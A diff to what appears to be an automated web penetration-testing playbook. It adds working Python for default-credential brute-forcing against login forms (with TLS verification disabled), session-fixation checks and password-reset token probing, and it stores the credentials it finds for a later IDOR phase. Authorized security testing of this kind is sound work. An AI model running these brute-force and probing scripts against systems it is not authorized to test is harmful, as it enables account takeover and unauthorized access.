@@ -1,7 +1,22 @@
 **Phase 3 — Authentication**
   - Find login form: extract action URL (absolute), field names
   - Test provided credentials first
-  - Test common defaults: admin/admin, admin/password, test/test, guest/guest
+  - Test common defaults — EXHAUSTIVE list (test ALL of these):
+      admin/admin, admin/admin123, admin/password, admin/password123, admin/123456,
+      admin/admin1, admin/letmein, admin/welcome, admin/changeme,
+      root/root, root/toor, root/password, root/admin,
+      test/test, test/test123, test/password, guest/guest, guest/password,
+      user/user, user/password, user/user123,
+      alice/password1, alice/alice, alice/123456,
+      bob/123456, bob/bob, bob/password,
+      charlie/letmein, charlie/charlie,
+      demo/demo, operator/operator, support/support
+    Store ALL successful logins in _G['discovered_creds'] = [] for IDOR phase:
+    ```python
+    _G.setdefault('discovered_creds', [])
+    # After each successful default login:
+    _G['discovered_creds'].append({'username': user, 'password': password})
+    ```
   - Test SQL injection in login fields — BUT you MUST confirm before reporting:
 
   SQLI LOGIN CONFIRMATION (mandatory — do all 3 steps):
@@ -40,6 +55,141 @@
   - Check: error message differences (user enumeration)
   - Check: account lockout after N attempts
   - Check: HTTPS on login form?
+
+  DEFAULT CREDENTIAL BRUTE-FORCE (mandatory — test ALL before proceeding):
+  ```python
+  import requests, time
+
+  BASE = _G['BASE']
+  login_url = _G.get('login_url', BASE + '/login')
+  user_field = _G.get('user_field', 'username')
+  pass_field = _G.get('pass_field', 'password')
+
+  DEFAULT_CREDS = [
+      ('admin', 'admin'), ('admin', 'admin123'), ('admin', 'password'),
+      ('admin', 'password123'), ('admin', '123456'), ('admin', 'letmein'),
+      ('admin', 'welcome'), ('admin', 'changeme'), ('admin', 'admin1'),
+      ('root', 'root'), ('root', 'toor'), ('root', 'password'),
+      ('test', 'test'), ('test', 'test123'), ('guest', 'guest'),
+      ('user', 'user'), ('user', 'password'),
+      ('alice', 'password1'), ('alice', 'alice'), ('alice', '123456'),
+      ('bob', '123456'), ('bob', 'bob'), ('bob', 'password'),
+      ('charlie', 'letmein'), ('charlie', 'charlie'),
+      ('demo', 'demo'), ('operator', 'operator'), ('support', 'support'),
+  ]
+
+  _G.setdefault('discovered_creds', [])
+  creds_a_user = _G.get('creds_a', {}).get('username', '')
+
+  # Get baseline failed login response
+  s = requests.Session()
+  s.verify = False
+  r_fail = s.post(login_url, data={user_field: 'nonexistent_user_xyz', pass_field: 'wrong_pass_xyz'}, allow_redirects=True)
+  fail_text = r_fail.text.lower()
+
+  for user, pwd in DEFAULT_CREDS:
+      if user == creds_a_user:
+          continue  # skip primary account
+      time.sleep(0.3)
+      try:
+          ts = requests.Session()
+          ts.verify = False
+          r = ts.post(login_url, data={user_field: user, pass_field: pwd}, allow_redirects=True)
+          body = r.text.lower()
+          # Success indicators
+          if ('logout' in body or 'dashboard' in body or 'welcome' in body or
+              user.lower() in body or 'profile' in body) and 'invalid' not in body[:300]:
+              print(f"  [HIGH] Default creds work: {user}/{pwd}")
+              _G['discovered_creds'].append({'username': user, 'password': pwd})
+          elif r.url != r_fail.url and 'login' not in r.url.lower():
+              print(f"  [HIGH] Default creds work (redirect): {user}/{pwd} → {r.url}")
+              _G['discovered_creds'].append({'username': user, 'password': pwd})
+      except Exception:
+          continue
+
+  print(f"\n[AUTH] Discovered {len(_G['discovered_creds'])} working default credential pairs")
+  for dc in _G['discovered_creds']:
+      print(f"  {dc['username']} / {dc['password']}")
+  ```
+
+  SESSION FIXATION TEST (mandatory):
+  ```python
+  import requests
+
+  BASE = _G['BASE']
+  login_url = _G.get('login_url', BASE + '/login')
+  user_field = _G.get('user_field', 'username')
+  pass_field = _G.get('pass_field', 'password')
+  creds_a = _G.get('creds_a', {})
+
+  s = requests.Session()
+  s.verify = False
+  # Visit login page to get pre-auth session cookie
+  r1 = s.get(login_url, allow_redirects=True)
+  pre_cookies = dict(s.cookies)
+  print(f"[SESSION] Pre-login cookies: {pre_cookies}")
+
+  # Log in
+  r2 = s.post(login_url, data={
+      user_field: creds_a.get('username', ''),
+      pass_field: creds_a.get('password', ''),
+  }, allow_redirects=True)
+  post_cookies = dict(s.cookies)
+  print(f"[SESSION] Post-login cookies: {post_cookies}")
+
+  # Check if session ID changed after login
+  session_keys = [k for k in pre_cookies if 'session' in k.lower() or 'sid' in k.lower() or k == 'session']
+  if not session_keys:
+      session_keys = list(pre_cookies.keys())  # compare all cookies
+
+  fixation_vuln = False
+  for key in session_keys:
+      if key in pre_cookies and key in post_cookies:
+          if pre_cookies[key] == post_cookies[key]:
+              print(f"  [HIGH] Session fixation: cookie '{key}' NOT rotated after login!")
+              print(f"    Pre-login:  {pre_cookies[key][:40]}")
+              print(f"    Post-login: {post_cookies[key][:40]}")
+              fixation_vuln = True
+  if not fixation_vuln:
+      print("  [OK] Session cookies rotated after login")
+  ```
+
+  PASSWORD RESET TOKEN PREDICTABILITY TEST (if reset endpoint exists):
+  ```python
+  import requests, time, re
+
+  BASE = _G['BASE']
+  session = _G.get('session') or requests.Session()
+  session.verify = False
+
+  RESET_PATHS = ['/forgot', '/forgot-password', '/reset', '/reset-password',
+                 '/password/reset', '/api/password/reset', '/account/forgot']
+
+  for path in RESET_PATHS:
+      url = BASE + path
+      try:
+          r = session.get(url, timeout=6, allow_redirects=True)
+          if r.status_code == 200 and ('email' in r.text.lower() or 'reset' in r.text.lower()):
+              print(f"  [INFO] Password reset page found: {url}")
+              # Request two tokens and compare for predictability
+              tokens = []
+              for i in range(2):
+                  r2 = session.post(url, data={'email': f'test{i}@test.local'}, timeout=10, allow_redirects=True)
+                  # Look for token in response or URL
+                  token_match = re.search(r'token[=:]\s*([a-zA-Z0-9_-]{8,})', r2.text)
+                  if token_match:
+                      tokens.append(token_match.group(1))
+                  time.sleep(0.5)
+              if len(tokens) == 2:
+                  # Check if tokens are sequential or similar
+                  if tokens[0][:6] == tokens[1][:6]:
+                      print(f"  [HIGH] Predictable reset tokens: {tokens[0][:20]}... vs {tokens[1][:20]}...")
+                  if all(t.isdigit() for t in tokens):
+                      print(f"  [CRITICAL] Numeric-only reset tokens: {tokens}")
+              break
+      except Exception:
+          continue
+  ```
 
   DUAL-SESSION SETUP (mandatory — do this right after the primary login succeeds):
   Log in BOTH accounts and store them in _G. Phase 17 IDOR requires both sessions.
@@ -90,6 +240,11 @@
     # Build field names from form (fallback to common names)
     user_field = next((f['name'] for f in login_fields if any(kw in f['name'].lower() for kw in ['user', 'email', 'login', 'name', 'account', 'id'])), 'username')
     pass_field = next((f['name'] for f in login_fields if 'pass' in f['name'].lower() or f.get('type') == 'password'), 'password')
+
+    # Store login details in _G for IDOR phase to use
+    _G['login_url'] = login_url
+    _G['user_field'] = user_field
+    _G['pass_field'] = pass_field
 
     r_a = session_a.post(login_url, data={
         user_field: creds_a.get('username',''),
